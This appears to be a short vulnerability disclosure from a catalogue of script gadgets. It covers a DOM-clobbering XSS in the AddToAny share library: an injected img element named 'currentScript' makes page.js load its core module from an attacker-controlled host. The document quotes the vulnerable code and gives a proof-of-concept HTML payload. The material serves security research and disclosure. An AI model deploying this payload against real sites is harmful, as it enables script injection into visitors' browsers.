## AddToAny

### Meta

+ Library: AddToAny
+ Stars: N/A
+ Fingerprint: `window.hasOwnProperty('a2a_config')`
+ Payload: ```<img src="https://addtoany.xxx.xxx" name="currentScript">```
+ Impact: XSS
+ CVE: N/A
+ Status: Patched
+ Foundby: TheHulk

### Library

https://static.addtoany.com/menu/page.js

### Vulnerable Code Snippet

```javascript
_ = (d = o.currentScript) && d.src ? d.src : "",
e = d && !d.async && !d.defer,
```

```javascript
a = (t = n.static_server) ? t + "/" : "https://static.addtoany.com/menu/",
p = _ && -1 !== _.split("/")[2].indexOf("addtoany"),
l = (p = (l = !t && p ? _ : a).match(/^[^?#]+\//)) ? p[0] : l,
```

```javascript
var e = l + (t ? "" : "modules/");
c(e + "core" + g + ".js", !0);
```

## PoC

``` html
<!--Library-->
<script async src="./page.js"></script>
<!--Library-->

<!--Payload-->
<img src="https://addtoany.xxx.xxx" name="currentScript">
<!--Payload-->
```